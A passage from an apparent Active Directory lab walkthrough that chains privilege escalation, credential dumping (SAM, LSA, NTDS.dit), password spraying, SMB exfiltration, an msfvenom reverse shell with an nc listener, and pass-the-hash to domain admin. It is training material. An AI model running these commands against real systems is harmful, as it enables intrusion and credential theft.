    Prints the script back, which now holds only the word test.
    
    **Why**Reading it back shows the write landed on the exact file the task executes, not on a copy.
    
    CLIENT-1 (PowerShell)
    
    ```
    echo 'net localgroup administrators j.miller /add'
    ```
    
    Copy
    
    Echoes the payload line to the screen without writing it anywhere.
    
    **Why**A dry run catches quoting mistakes before the text goes into a file that SYSTEM will run.
    
    CLIENT-1 (PowerShell)
    
    ```
    echo 'net localgroup administrators j.miller /add' > C:\ProgramData\BackupSvc\decoy-web.ps1
    ```
    
    Copy
    
    Writes the payload into the task script.
    
    **Why**The script now adds j.miller to the local administrators, and the task runs it as SYSTEM at the next start.
    
    CLIENT-1 (PowerShell)
    
    ```
    cat C:\ProgramData\BackupSvc\decoy-web.ps1
    ```
    
    Copy
    
    Prints the script to confirm the payload is in place.
    
    **Why**The last look before a reboot: the file must hold exactly one line and nothing from the decoy.
    
    CLIENT-1 (PowerShell)
    
    ```
    whoami
    ```
    
    Copy
    
    Prints the current account name.
    
    **Why**This is the baseline the reboot has to change.
    
    CLIENT-1 (PowerShell)
    
    ```
    whoami /all
    ```
    
    Copy
    
    Prints the groups and privileges of the current token.
    
    **Why**The token has no administrative group yet, so any admin group after the reboot came from our payload.
    
    CLIENT-1 (PowerShell)
    
    ```
    Restart-Computer
    ```
    
    Copy
    
    Restarts the client immediately.
    
    **Why**The task only fires at system start, so a restart is what makes SYSTEM run our script.
    
    **Tip**The PowerShell failure is worth remembering: inside double quotes the outer shell expands $_ before the inner command runs. Type it in cmd, or use single quotes around the whole argument.
    
12. 12Confirm local admin and dump the secrets_51:12_
    
    When the client comes back, the same credential now answers with Pwn3d on that host only, which means j.miller is a local administrator there. The controller and the second client still accept the password without giving any administrative right, so the group change was local, exactly as the payload said.
    
    Administrator on a workstation is worth a set of local secrets. The SAM dump gives the local account hashes, which are only useful on another host that reuses a local password. The LSA dump gives cached domain credentials for the users who logged on here, plus the machine account keys. The third command does both in one tool. None of it is a domain administrator hash, and that is the point: local admin on one machine is a step, not the end.
    
    Kali
    
    ```
    netexec smb ../ips -u j.miller -p ../pass
    ```
    
    Copy
    
    Tests the j.miller password against the three hosts using the target and password files one folder up.
    
    **Why**The working shell is inside the tool folder at this moment, so the file paths need the parent folder prefix.
    
    Kali
    
    ```
    cd ../
    ```
    
    Copy
    
    Moves back up to the chain folder.
    
    **Why**Every later command uses the short file names, so we leave the tool folder once the check is done.
    
    Kali
    
    ```
    ls
    ```
    
    Copy
    
    Lists the chain folder with everything collected so far.
    
    **Why**A check that the loot from the client is here before we add the hashes to it.
    
    Kali
    
    ```
    netexec smb ips -u j.miller -p pass --sam
    ```
    
    Copy
    
    Dumps the local SAM hashes from every host where the account is a local administrator.
    
    **Why**The SAM holds the local account hashes, which are only useful on another machine that reuses a local password.
    
    Kali
    
    ```
    netexec smb ips -u j.miller -p pass --lsa
    ```
    
    Copy
    
    Dumps the LSA secrets, including cached domain credentials and machine account keys.
    
    **Why**Cached domain logons let us crack a domain password offline, and the machine keys can be used to forge a service ticket.
    
    Kali
    
    ```
    impacket-secretsdump j.miller:'Marines#1'@10.0.2.132
    ```
    
    Copy
    
    Runs the same collection with the impacket tool, in one pass over the client.
    
    **Why**One tool gives the local hashes, the cached credentials and the machine keys together, which is easier to keep in a report than three separate runs.
    
    **Tip**A local administrator is not a domain administrator. Write down exactly which host the Pwn3d line names, and keep hunting for a domain path.
    
13. 13Hunt profiles and PowerShell history_55:00_
    
    The new administrator session on the client is the place to look for what other people left behind. The profile tree is the same one we saw as a normal user, but this time the whole tree is readable, and one file stands out: backup.zip in the Documents folder of the backup service account.
    
    Before taking it, we check the one file that records what an administrator typed. PowerShell keeps command history per user, and the option cmdlet prints the path of that file. Ours holds only the commands we ran ourselves. The backup account has no history file at all, and the local user has an empty one, so there is no password to read here. The archive is the lead.
    
    CLIENT-1 (PowerShell)
    
    ```
    tree /a /f c:\users
    ```
    
    Copy
    
    Prints the full profile tree, including files.
    
    **Why**As a local administrator we can finally see every profile, and a backup account's Documents folder is where backup tools leave their output.
    
    CLIENT-1 (PowerShell)
    
    ```
    cd c:\
    ```
    
    Copy
    
    Moves to the root of the system drive.
    
    **Why**We are about to walk the disk from the top, so the root is the starting point.
    
    CLIENT-1 (PowerShell)
    
    ```
    ls
    ```
    
    Copy
    
    Lists the contents of the root folder.
    
    **Why**The same listing as before, now as an administrator: it tells us which folders exist without the hidden ones.
    
    CLIENT-1 (PowerShell)
    
    ```
    ls -force
    ```
    
    Copy
    
    Lists the root including hidden and system items.
    
    **Why**Hidden folders can hold configuration or scripts that a plain listing never shows.
    
    CLIENT-1 (PowerShell)
    
    ```
    Get-PSReadLineOption
    ```
    
    Copy
    
    Prints the options of the line editor, including the history settings.
    
    **Why**The history setting tells us whether commands are saved to disk and where, which decides if there is anything to read.
    
    CLIENT-1 (PowerShell)
    
    ```
    Get-PSReadLineOption | fl HistorySavePath
    ```
    
    Copy
    
    Prints only the option that holds the history file path.
    
    **Why**The path is the file we want, and the full option table is too noisy to read it from.
    
    CLIENT-1 (PowerShell)
    
    ```
    cat C:\Users\j.miller\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    ```
    
    Copy
    
    Prints our own command history file.
    
    **Why**It shows what this account typed, which here is only our own work.
    
    CLIENT-1 (PowerShell)
    
    ```
    ls c:\users
    ```
    
    Copy
    
    Lists the profiles again.
    
    **Why**The archive sits under one of these profiles, and we need the exact folder name before changing into it.
    
    CLIENT-1 (PowerShell)
    
    ```
    cat C:\Users\svc_backup\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    ```
    
    Copy
    
    Tries to read the history of the backup account.
    
    **Why**The error tells us that account never ran an interactive PowerShell session, so there is no history to leak.
    
    CLIENT-1 (PowerShell)
    
    ```
    cat C:\Users\sophia\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    ```
    
    Copy
    
    Tries to read the history of the local user.
    
    **Why**An empty result closes the history idea, and the profile tree remains the useful find.
    
    **Tip**History files are worth checking on every host you land on: they often contain a command with a password in it. An empty result is also a finding, so note it.
    
14. 14Pull the archive off the host and crack it_57:12_
    
    The archive sits in the Documents folder of the backup account, 1 KB of encrypted zip. Windows has no friendly way to hand us a file, so we turn the direction around: we start an SMB server on Kali and mount it from the client, then copy the archive into it. A mapped share is the fastest exfiltration path when you already have a session on the host and outbound SMB is allowed.
    
    The archive is encrypted with AES, which the standard unzip cannot read, so it skips every entry. The 7-Zip tool handles it and asks for a password at the prompt; the files come out, but we want the password itself, because it may be reused. zip2john turns the archive into a hash that John can attack, and the wordlist returns the password in seconds because it is a leetspeak phrase built from a song title.
    
    With the password known the extraction is reproducible: one command with the password attached. The archive holds three files, and their names say what matters: the credential file for the finance account, a notes file, and an invoice that turns out to be a decoy. The credential file gives a second domain user with a password, and the note about the finance box explains where it will work.
    
    CLIENT-1 (PowerShell)
    
    ```
    cd C:\users\svc_backup\
    ```
    
    Copy
    
    Changes into the profile of the backup service account.
    
    **Why**This account's Documents folder is where the backup tool keeps its own output.
    
    CLIENT-1 (PowerShell)
    
    ```
    ls
    ```
    
    Copy
    
    Lists the contents of the profile folder.
    
    **Why**A quick check that the profile really belongs to the account, and which folders are present.
    
    CLIENT-1 (PowerShell)
    
    ```
    cd .\Documents\
    ```
    
    Copy
    
    Changes into the Documents folder.
    
    **Why**Backup tools write to Documents more often than to any other folder, and that is where the archive is.
    
    CLIENT-1 (PowerShell)
    
    ```
    ls
    ```
    
    Copy
    
    Lists the folder and shows a single archive, a little over a kilobyte.
    
    **Why**A small encrypted archive is worth more than a large one: it is small enough to hold credentials, and it was worth encrypting.
    
    Kali
    
    ```
    impacket-smbserver share . -debug -smb2support
    ```
    
    Copy
    
    Starts an SMB server in the current folder, with debug output and SMB2 support.
    
    **Why**Modern Windows refuses to mount a share that does not offer SMB2, and the debug log shows the authentication of the client.
    
    CLIENT-1 (PowerShell)
    
    ```
    net use \\10.0.2.135\share
    ```
    
    Copy
    
    Mounts our share on the client without a drive letter.
    
    **Why**Once the share is mounted it is a path like any other, so a plain copy is enough to move the file.
    
    CLIENT-1 (PowerShell)
    
    ```
    copy .\backup.zip \\10.0.2.135\share
    ```
    
    Copy
    
    Copies the archive into our share, which lands it on Kali.
    
    **Why**Copying to the mounted share is the exfiltration: no tool on the target has to reach the internet.
    
    Kali
    
    ```
    unzip backup.zip
    ```
    
    Copy
    
    Tries the standard unzip on the archive.
    
    **Why**It reports every entry as unreadable because the archive uses AES, which is the version of the format this tool cannot open.
    
    Kali
    
    ```
    7z e backup.zip
    ```
    
    Copy
    
    Extracts the archive with 7-Zip, which asks for a password at a prompt.
    
    **Why**7-Zip supports the encrypted format, so the files come out; the password is typed at the hidden prompt and is not stored.
    
    Kali
    
    ```
    zip2john backup.zip
    ```
    
    Copy
    
    Prints the hash of the archive in the format John reads.
    
    **Why**The hash is what the cracker attacks, and the output shows the archive was recognised as an encrypted zip.
    
    Kali
    
    ```
    zip2john backup.zip > zip.hash
    ```
    
    Copy
    
    Writes the same hash into the file zip.hash.
    
    **Why**The cracker takes a file, and keeping the hash on disk means the attack does not have to rebuild it.
    
    Kali
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
    ```
    
    Copy
    
    Runs John against the hash with the rockyou wordlist.
    
    **Why**The password was typed by hand earlier but never seen; cracking it makes it a recorded credential instead of a guess.
    
    Kali
    
    ```
    gedit pass
    ```
    
    Copy
    
    Opens the password file to add the cracked password.
    
    **Why**The same password may be reused by an account, so it joins the file every spray below uses.
    
    Kali
    
    ```
    7z e backup.zip -p'bLo0dY_h3Ll'
    ```
    
    Copy
    
    Extracts the archive again with the cracked password given on the command line.
    
    **Why**This is the repeatable form of the extraction: no prompt, and the password is now known and written down.
    
    Kali
    
    ```
    cat invoice.pdf
    ```
    
    Copy
    
    Prints the invoice file as raw text.
    
    **Why**Reading the file confirms it is only a paid invoice with no hidden text, so it is a decoy and can be dropped from the report.
    
    Kali
    
    ```
    cat notes.txt
    ```
    
    Copy
    
    Prints the notes file that came out of the archive.
    
    **Why**The notes explain the backup schedule and name the finance box, which tells us which machine the new account belongs to.
    
    Kali
    
    ```
    cat a_reed_creds.txt
    ```
    
    Copy
    
    Prints the credential file that came out of the archive, this time with the output on screen.
    
    **Why**The file names the finance account, its password, and the note that RDP on that host was moved off the default port.
    
    Kali
    
    ```
    gedit pass
    ```
    
    Copy
    
    Opens the password file to add the password from the credential file.
    
    **Why**The new password joins the spray list, which is now three passwords, and the next spray tests every user against all three.
    
    **Tip**Mount our share instead of downloading: outbound SMB from the target is allowed far more often than inbound. Start the server in the folder you want the file to land in.
    
15. 15Spray the finance password and land on CLIENT-2_1:05:20_
    
    The password list now holds three entries, so the full spray is worth one more run. It shows three working pairs: the first account we were given, the finance account from the archive, and one more that is only valid on the second client. That third line is the interesting one, because it belongs to a different account and it appears on the finance machine.
    
    We confirm the finance account on its own. SMB accepts it on all three hosts, which is normal for a domain account, but only the second client gives an administrative result over WinRM, and RDP shows the same. The token check in the new session confirms why: the account is a member of the remote management group on that host, so the session is a full administrator session and the next machine is open.
    
    Kali
    
    ```
    netexec smb ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Sprays every user in the list with all three passwords over SMB on the three hosts.
    
    **Why**A new password is only worth having if it is tried against every account, because reuse is the reason to collect passwords at all.
    
    Kali
    
    ```
    netexec smb ips -u a.reed -p pass --continue-on-success
    ```
    
    Copy
    
    Runs the same spray with only the finance account, against the whole password list.
    
    **Why**This isolates the account: it shows which of the three passwords is the right one for it.
    
    Kali
    
    ```
    netexec smb ips -u a.reed -p 'Raiders#1' --continue-on-success
    ```
    
    Copy
    
    Tests the finance account with the password that worked, on all three hosts.
    
    **Why**The single-pair run gives a clean list of the hosts that accept it, without the noise of the other users.
    
    Kali
    
    ```
    netexec winrm ips -u a.reed -p 'Raiders#1' --continue-on-success
    ```
    
    Copy
    
    Tests WinRM for the finance account on all three hosts.
    
    **Why**WinRM decides whether the account can give a remote PowerShell session, which is the fastest way to work on the client.
    
    Kali
    
    ```
    netexec wmi ips -u a.reed -p 'Raiders#1'
    ```
    
    Copy
    
    Tests WMI with the same credential.
    
    **Why**WMI answers whether the account can run commands remotely even where no shell service is offered.
    
    Kali
    
    ```
    netexec rdp ips -u a.reed -p 'Raiders#1'
    ```
    
    Copy
    
    Tests RDP with the same credential.
    
    **Why**RDP is the fallback if the shell service is restricted, and the archive note warned that this host moved RDP off the default port.
    
    CLIENT-2 (WinRM)
    
    ```
    whoami /all
    ```
    
    Copy
    
    Prints the groups and privileges of the new session.
    
    **Why**The group list explains why WinRM worked here and nowhere else: the account is in the remote management group of this machine.
    
    **Tip**Spray the whole list after every new password. The account that answers is often not the one the password was found next to, because system administrators reuse passwords across accounts.
    
16. 16Take the writable service binary_1:13:12_
    
    On the second client the profile tree shows a script on the administrator's desktop with a name that suggests deployments. It is the obvious lead, and it is closed: the file cannot be read and its permissions cannot be listed, so it stays out of reach for this account.
    
    We let the checker look at services instead. It reports one service whose binary any authenticated user can modify, and the service queries confirm the three facts that make it a way to SYSTEM: it starts automatically, it runs as the local system account, and its binary sits in a folder our account can write to. The permissions are confirmed twice, once with the PowerShell cmdlet and once with the service descriptor, and the mask next to the users group is modify.
    
    The service itself cannot be started or stopped by us, because the descriptor gives the interactive user only read rights. That is not a problem: the service starts with the machine, so replacing the binary and waiting for a restart is enough. A one letter write proves it, and reading the file back shows the letter.
    
    CLIENT-2 (PowerShell)
    
    ```
    tree /a /f c:\users
    ```
    
    Copy
    
    Prints the full profile tree of the second client, including files.
    
    **Why**A machine that runs a deployment agent usually has its scripts in an administrator profile, so the tree is the first place to look.
    
    CLIENT-2 (PowerShell)
    
    ```
    cd C:\Users\Administrator\
    ```
    
    Copy
    
    Changes into the administrator profile.
    
    **Why**The checkout script we saw in the tree lives under this profile, and the profile itself is readable even when that file is not.
    
    CLIENT-2 (PowerShell)
    
    ```
    cd .\Desktop\
    ```
    
    Copy
    
    Changes into the desktop folder.
    
    **Why**Deployment scripts are usually run from the desktop of the account that wrote them.
    
    CLIENT-2 (PowerShell)
    
    ```
    cat .\Deploy-Agent.ps1
    ```
    
    Copy
    
    Tries to read the deployment script.
    
    **Why**The access denied answer tells us this lead is closed for our account, so we stop pushing on it and go back to the automated findings.
    
    CLIENT-2 (PowerShell)
    
    ```
    get-acl .\Deploy-Agent.ps1 | fl
    ```
    
    Copy
    
    Tries to print the permissions of the same script.
    
    **Why**Even the ACL is protected, which confirms the file is not a path for us and saves time.
    
    CLIENT-2 (PowerShell)
    
    ```
    cd ..\..\
    ```
    
    Copy
    
    Moves back up to the root of the drive.
    
    **Why**We leave the unreachable profile and go to the staging folder for the tools.
    
    CLIENT-2 (PowerShell)
    
    ```
    wget 10.0.2.135/PowerUp.ps1|iex;Invoke-AllChecks
    ```
    
    Copy
    
    Downloads PowerUp and runs every check on this host.
    
    **Why**The checker that found nothing on the first client is run again here, because the two machines have different services.
    
    CLIENT-2 (PowerShell)
    
    ```
    sc.exe qc PrintConfigSvc
    ```
    
    Copy
    
    Prints the configuration of the service the checker flagged.
    
    **Why**The query shows the account it runs as, its start type and the exact path of the binary.
    
    CLIENT-2 (PowerShell)
    
    ```
    get-acl C:\Apps\PrintConfig\printconfig.exe | fl
    ```
    
    Copy
    
    Prints the permissions of the service binary in long list form.
    
    **Why**The access mask next to the users and authenticated users entries is what proves that our account can replace the binary.
    
    CLIENT-2 (PowerShell)
    
    ```
    sc.exe start PrintConfigSvc
    ```
    
    Copy
    
    Tries to start the service.
    
    **Why**The access denied answer shows the account cannot start it, which changes the plan to a reboot.
    
    CLIENT-2 (PowerShell)
    
    ```
    sc.exe stop PrintConfigSvc
    ```
    
    Copy
    
    Tries to stop the service.
    
    **Why**The same denial confirms there is no way to make the service re-read its binary on demand.
    
    CLIENT-2 (PowerShell)
    
    ```
    (sc.exe sdshow PrintConfigSvc|ConvertFrom-SddlString)
    ```
    
    Copy
    
    Prints the security descriptor of the service as readable access entries.
    
    **Why**The descriptor explains the denial: the interactive user has only limited rights, and full control belongs to the system account and the administrators group.
    
    CLIENT-2 (PowerShell)
    
    ```
    (sc.exe sdshow PrintConfigSvc|ConvertFrom-SddlString).DiscretionaryAcl
    ```
    
    Copy
    
    Prints just the access list from the same descriptor.
    
    **Why**The short list is easier to read, and it confirms that no entry gives our account start or stop rights.
    
    CLIENT-2 (PowerShell)
    
    ```
    echo a > C:\Apps\PrintConfig\printconfig.exe
    ```
    
    Copy
    
    Overwrites the service binary with a single letter.
    
    **Why**A harmless write proves the modify right on the exact file the service runs, without leaving a payload behind.
    
    CLIENT-2 (PowerShell)
    
    ```
    cat C:\Apps\PrintConfig\printconfig.exe
    ```
    
    Copy
    
    Prints the binary back, which now holds only that letter.
    
    **Why**Reading it back confirms the write landed on the file the service executes, not on a copy.
    
    **Tip**Read the service descriptor before planning the attack. Write access to the binary plus an automatic start is enough, and start or stop rights are not needed.
    
17. 17Replace the binary and catch SYSTEM_1:19:08_
    
    The payload is a small executable that connects back to us. We build it with the framework's payload generator, using our own interface as the callback address and port 443, which leaves as an ordinary HTTPS port if anything inspects the traffic. The file is served by the same Python web server that delivered the checkers.
    
    On the client we download the payload and write it over the service binary with the path the service command showed. Then we start a listener and run the binary by hand once, which proves it works but gives a shell as the finance user, because we started it. The service query still shows the automatic start and the system account, so a restart of the host is what turns the same file into a SYSTEM shell. The restart itself is not shown, but the next command is a `whoami` in the new session and it reports the system account, which is the proof.
    
    From that SYSTEM shell we add the finance account to the local administrators, so the access survives a reboot without the payload, and we check it from our side. Then we go back to the folder the finance account could not read earlier, and this time the deployment script opens. It holds a hardcoded service account and its password, with a comment asking for the credential to be rotated after a migration that never happened.
    
    Kali
    
    ```
    cd privesc
    ```
    
    Copy
    
    Moves into the folder that holds the privilege escalation tools.
    
    **Why**The payload is built here and the running web server already serves this folder, so no extra step is needed to publish it.
    
    Kali
    
    ```
    msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=eth0 LPORT=443 -f exe > shell.exe
    ```
    
    Copy
    
    Builds a 64-bit Windows executable that connects back to our address on port 443, and writes it to shell.exe.
    
    **Why**A staged reverse shell is the payload for the service binary; the interface name resolves to our lab address, and 443 is the least likely port to be filtered.
    
    Kali
    
    ```
    ip a
    ```
    
    Copy
    
    Prints our interfaces and addresses.
    
    **Why**The payload has to call back to an address the target can reach, so we confirm which one our lab network uses.
    
    CLIENT-2 (PowerShell)
    
    ```
    wget 10.0.2.135/printconfig.exe -o C:\Apps\PrintConfig\printconfig.exe
    ```
    
    Copy
    
    Downloads the payload and writes it over the service binary at the full path the service uses.
    
    **Why**The write is what the modify right allows; the target path must be the exact binary path from the service configuration.
    
    Kali
    
    ```
    rlwrap nc -lvnp 443
    ```
    
    Copy
    
    Starts a listener on port 443 with line editing.
    
    **Why**The port must match the payload, and line editing makes an interactive Windows shell usable.
    
    CLIENT-2 (PowerShell)
    
    ```
    C:\Apps\PrintConfig\printconfig.exe
    ```
    
    Copy
    
    Runs the replaced binary by hand.
    
    **Why**A manual run proves the payload executes and the callback reaches us before we depend on the service to start it.
    
    CLIENT-2 (PowerShell)
    
    ```
    sc.exe qc PrintConfigSvc
    ```
    
    Copy
    
    Prints the service configuration again.
    
    **Why**The query confirms the start type and the account, which is what decides that a restart runs our file as SYSTEM.
    
    CLIENT-2 (SYSTEM)
    
    ```
    whoami
    ```
    
    Copy
    
    Prints the account of the shell that arrived on the listener.
    
    **Why**The answer is the local system account, which is the escalation the writable binary promised.
    
    CLIENT-2 (SYSTEM)
    
    ```
    net localgroup administrators a.reed /add
    ```
    
    Copy
    
    Adds the finance account to the local administrators of the client.
    
    **Why**A group membership keeps the administrative access after a reboot, without depending on the payload staying in place.
    
    Kali
    
    ```
    netexec smb ips -u a.reed -p pass --continue-on-success
    ```
    
    Copy
    
    Checks the finance account against all three hosts again.
    
    **Why**The client now answers with Pwn3d for this account, and the other client does too, which shows how far the membership reaches.
    
    CLIENT-2 (SYSTEM)
    
    ```
    cd c:\users
    dir
    ```
    
    Copy
    
    Changes to the users folder and lists it from the system shell.
    
    **Why**The system account can read profiles the finance user could not, including the administrator desktop.
    
    CLIENT-2 (SYSTEM)
    
    ```
    cd administrator\desktop
    ls
    ```
    
    Copy
    
    Changes into the administrator desktop and lists it.
    
    **Why**This is the folder whose script refused to open at the start of the previous step.
    
    CLIENT-2 (SYSTEM)
    
    ```
    cat Deploy-Agent.ps1
    ```
    
    Copy
    
    Prints the deployment script.
    
    **Why**The script holds a service account and its password in plain text, with a comment that the credential was never rotated.
    
    **Tip**Replace a service binary only after proving the write with a harmless file. If the service cannot be restarted and the host cannot be rebooted, the same idea works on the binary of a scheduled task or a startup program.
    
18. 18From the deploy script to the domain database_1:26:08_
    
    Back on Kali the password file now holds four passwords. The spray with all of them returns a third working pair: the account named in the deployment script, with the password that was hardcoded next to it, and it works on all three hosts. A quick check with the service account name from the script fails, which shows the password belongs to the person, not to the service. Over WinRM the account is an administrator on the controller itself, so the last machine falls.
    
    We open a remote PowerShell session on the controller as that account. The task now is the domain database. The tool of choice is a shadow copy: a script asks the volume service for a persistent snapshot of the system drive and exposes it as a new drive letter. The volume snapshot files are locked by the directory service, and the backup privilege, which an administrator on a controller holds, is what lets us read them.
    
    From the snapshot we save the two registry hives and copy the directory database. The copy has to use backup mode, which reads the file while the service holds it open. The database and the SYSTEM hive come back to Kali, and the offline extraction reads every account hash in the domain. The Administrator hash is enough to open a shell on the controller without a password, and the last check confirms the system account on the domain controller.
    
    Kali
    
    ```
    ls
    ```
    
    Copy
    
    Lists the chain folder from the Kali prompt.
    
    **Why**We are back on our own machine after the Windows work, and this shows everything collected so far is still here.
    
    Kali
    
    ```
    cat pass
    ```
    
    Copy
    
    Prints the password file, which now holds four passwords.
    
    **Why**The new password from the deployment script joins the list, and this is the check that it was written down.
    
    Kali
    
    ```
    netexec smb ips -u users -p pass --continue-on-success | grep -vi STATUS_LOGON_FAILURE
    ```
    
    Copy
    
    Sprays every user with all four passwords over SMB and keeps only the successful lines.
    
    **Why**One run tests the new password against every account, which is how a reused password turns into a new domain credential.
    
    Kali
    
    ```
    netexec smb ips -u t.okoro -p 'Macj*2216'
    ```
    
    Copy
    
    Tests the account from the deployment script with its password on all three hosts.
    
    **Why**The single pair confirms the hit and shows how widely it is accepted.
    
    Kali
    
    ```
    cat users
    ```
    
    Copy
    
    Prints the user list file built earlier.
    
    **Why**The script named a service account as well as a person, and this shows whether that account exists in the domain.
    
    Kali
    
    ```
    netexec smb ips -u deploy_svc -p 'Macj*2216'
    ```
    
    Copy
    
    Tests the service account name with the same password.
    
    **Why**The failure tells us the password is the person's, not the service account's, which is what the description field suggested.
    
    Kali
    
    ```
    netexec winrm ips -u t.okoro -p 'Macj*2216'
    ```
    
    Copy
    
    Tests WinRM for the account on all three hosts.
    
    **Why**An administrative WinRM result on the controller is the shortest route to the domain database.
    
    Kali
    
    ```
    netexec rdp ips -u t.okoro -p 'Macj*2216'
    ```
    
    Copy
    
    Tests RDP for the same account.
    
    **Why**RDP is the alternative if the shell service is restricted, and it costs one line to know.
    
    Kali
    
    ```
    netexec wmi ips -u t.okoro -p 'Macj*2216'
    ```
    
    Copy
    
    Tests WMI for the same account.
    
    **Why**WMI shows the account can run commands on the controller even outside a shell session.
    
    Kali
    
    ```
    evil-winrm -i 10.0.2.9 -u t.okoro -p 'Macj*2216'
    ```
    
    Copy
    
    Opens a remote PowerShell session on the controller as the account.
    
    **Why**A shell on the controller with administrative rights is what the next steps need, and evil-winrm gives file upload and download as well.
    
    Kali (gedit)
    
    ```
    set context persistent nowriters
    add volume c: alias viper
    create
    expose %viper% x:
    ```
    
    Copy
    
    The file viper.dsh holds the four lines of the shadow copy script: set the context to persistent, add the system volume under the alias viper, create the snapshot, and expose it as drive x.
    
    **Why**A script file is the reliable way to feed diskshadow; typed at its prompt the commands are easy to mistype, and the alias keeps the expose line short.
    
    Kali
    
    ```
    unix2dos viper.dsh
    ```
    
    Copy
    
    Converts the script to Windows line endings.
    
    **Why**diskshadow reads its script line by line and fails on Unix line endings, so the file has to be converted before it is uploaded.
    
    DC01 (evil-winrm)
    
    ```
    cd c:\windows\tasks
    ```
    
    Copy
    
    Changes into the tasks folder on the controller.
    
    **Why**The folder is writable for administrators, and it is where the script and the saved hives will sit until they are downloaded.
    
    DC01 (evil-winrm)
    
    ```
    upload viper.dsh
    ```
    
    Copy
    
    Uploads the shadow copy script to the current folder.
    
    **Why**The built-in upload command moves the file without opening a second channel to the host.
    
    DC01 (evil-winrm)
    
    ```
    diskshadow /s viper.dsh
    ```
    
    Copy
    
    Runs diskshadow with the uploaded script.
    
    **Why**The script creates a persistent snapshot of the system volume and exposes it as a drive letter we can read.
    
    DC01 (evil-winrm)
    
    ```
    reg save hklm\system c:\windows\tasks\system
    ```
    
    Copy
    
    Saves the SYSTEM hive from the registry into the tasks folder.
    
    **Why**The SYSTEM hive holds the boot key that decrypts the local hashes and the cached domain logons.
    
    DC01 (evil-winrm)
    
    ```
    reg save hklm\sam c:\windows\tasks\sam
    ```
    
    Copy
    
    Saves the SAM hive into the same folder.
    
    **Why**The SAM holds the local account hashes of the controller, which are needed with the boot key.
    
    DC01 (evil-winrm)
    
    ```
    download sam
    ```
    
    Copy
    
    Downloads the saved SAM hive to Kali.
    
    **Why**The extraction runs on our machine, so the hives have to come back with the database.
    
    DC01 (evil-winrm)
    
    ```
    download system
    ```
    
    Copy
    
    Downloads the saved SYSTEM hive to Kali.
    
    **Why**The SYSTEM hive is the key to the other two files, so it travels with them.
    
    DC01 (evil-winrm)
    
    ```
    robocopy /b x:\windows\ntds . ntds.dit
    ```
    
    Copy
    
    Copies the directory database out of the shadow copy in backup mode.
    
    **Why**The live database is locked by the directory service; backup mode reads it through the snapshot, which is the only way to get a consistent copy.
    
    DC01 (evil-winrm)
    
    ```
    download ntds.dit
    ```
    
    Copy
    
    Downloads the copied database to Kali.
    
    **Why**The three files together, database, SAM and SYSTEM, are everything the offline extraction needs.
    
    Kali
    
    ```
    impacket-secretsdump -ntds ntds.dit -system system -sam sam local
    ```
    
    Copy
    
    Reads the database offline with the SYSTEM hive and prints every account hash in the domain.
    
    **Why**Nothing touches the controller, and the output includes the Administrator hash, which is the goal of the chain.
    
    Kali
    
    ```
    impacket-psexec administrator@10.0.2.9 -hashes :c0ced2de918b4a7c1b9f4efd225dd503
    ```
    
    Copy
    
    Opens a shell on the controller as Administrator by passing the extracted hash instead of a password.
    
    **Why**The hash authenticates the account, so the domain is owned without ever cracking the password.
    
    DC01 (psexec)
    
    ```
    whoami
    ```
    
    Copy
    
    Prints the identity of the new shell.
    
    **Why**The answer is the system account on the domain controller, which is the end of the chain.
    
    **Tip**A shadow copy is a read of the volume, so it works while the directory service runs. Delete the snapshot when the work is done so the controller is left as it was found.







